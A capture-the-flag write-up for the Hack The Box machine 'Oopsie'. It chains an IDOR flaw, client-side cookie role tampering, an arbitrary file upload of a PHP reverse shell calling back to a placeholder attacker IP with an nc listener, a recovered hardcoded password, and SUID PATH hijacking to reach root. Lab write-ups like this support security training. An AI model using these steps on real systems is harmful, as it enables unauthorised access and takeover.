# Hack The Box — Oopsie Write-up 

## Overview

**Oopsie** is a web-focused machine that demonstrates how **information disclosure** and **broken access control** vulnerabilities can be chained to achieve **remote code execution** and **privilege escalation**. The box emphasizes the importance of inspecting cookies, session handling, and authorization logic in authenticated web applications.

---

## Enumeration

### Port Scanning

Initial enumeration was performed using Nmap:

```bash
nmap -sC -sV <TARGET_IP>
```

**Open Ports Identified**

* **22/tcp** — SSH
* **80/tcp** — HTTP

This indicates a web application as the primary attack surface.

---

## Web Enumeration

Visiting `http://<TARGET_IP>/` revealed a corporate-style website for an automotive company. The homepage referenced services accessible via authentication, suggesting the presence of a login portal.

### Passive Spidering with Burp Suite

A passive crawl was performed by routing browser traffic through **Burp Suite** with interception disabled. This populated the **Target → Site Map** without generating additional requests.

An interesting directory was discovered:

```
/cdn-cgi/login/
```

Accessing this path revealed a login page with an option to **Login as Guest**.

---

## Authentication & Authorization Flaws

### Guest Access

Logging in as **Guest** exposed limited functionality. The **Uploads** page was visible but restricted to **super admin** users.

### Cookie & IDOR Analysis

Inspection of browser cookies revealed values similar to:

```
role=guest
user=<numeric_id>
```

Additionally, URLs contained a user ID parameter:

```
/cdn-cgi/login/admin.php?content=accounts&id=2
```

By modifying the `id` parameter (e.g., changing it to `id=1`), user information for other accounts was disclosed. This confirmed an **Insecure Direct Object Reference (IDOR)** vulnerability.

### Privilege Escalation via Cookie Manipulation

Using the disclosed admin user ID, the cookie values were modified to:

```
role=admin
user=<admin_id>
```

Revisiting the **Uploads** page after this change granted access to the file upload functionality.

---

## Foothold

### File Upload Abuse

With admin access, a PHP reverse shell was uploaded. The shell was configured with:

* **Attacker IP:** `<ATTACKER_IP>`
* **Listening Port:** `<ATTACKER_PORT>`

The upload directory was identified as:

```
/uploads/
```

A listener was started:

```bash
nc -lvnp <ATTACKER_PORT>
```

Triggering the uploaded shell:

```
http://<TARGET_IP>/uploads/php-reverse-shell.php
```

A reverse shell was received as the **www-data** user.

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement

### Credential Discovery

While enumerating the web application files under:

```
/var/www/html/cdn-cgi/login/
```

A recursive search revealed hardcoded credentials:

```bash
grep -Rni "passw" .
```

**Discovered password:**

```
MEGACORP_4dm1n!!
```

### User Enumeration

Checking `/etc/passwd` revealed a local user:

```
robert
```

Further inspection of `db.php` exposed database credentials, which allowed successful authentication as user **robert**.

The **user flag** was retrieved from:

```
/home/robert/
```

---

## Privilege Escalation

### Group Enumeration

User `robert` was found to be part of the **bugtracker** group.

Searching for binaries owned by this group:

```bash
find / -group bugtracker 2>/dev/null
```

Result:

```
/usr/bin/bugtracker
```

### SUID Binary Abuse

The `bugtracker` binary had the **SUID bit set** and was owned by `root`.

The binary executed the `cat` command without specifying an absolute path, making it vulnerable to **PATH hijacking**.

### Exploitation

A malicious `cat` binary was created in `/tmp`:

```bash
cd /tmp
echo "/bin/sh" > cat
chmod +x cat
export PATH=/tmp:$PATH
```

Executing the vulnerable binary:

```bash
/usr/bin/bugtracker
```

Resulted in a **root shell**.

---

## Root Access

With root privileges obtained, the **root flag** was retrieved from:

```
/root/
```

---

## Vulnerabilities Summary

* Broken Access Control (IDOR)
* Cookie Manipulation / Trusting Client-Side Authorization
* Arbitrary File Upload
* Hardcoded Credentials
* SUID Binary with PATH Injection

---

## Conclusion

Oopsie is an excellent example of how **low-severity web vulnerabilities**, when chained together, can result in full system compromise. The machine reinforces the importance of strict server-side authorization checks, secure file upload handling, and safe usage of privileged binaries.
---
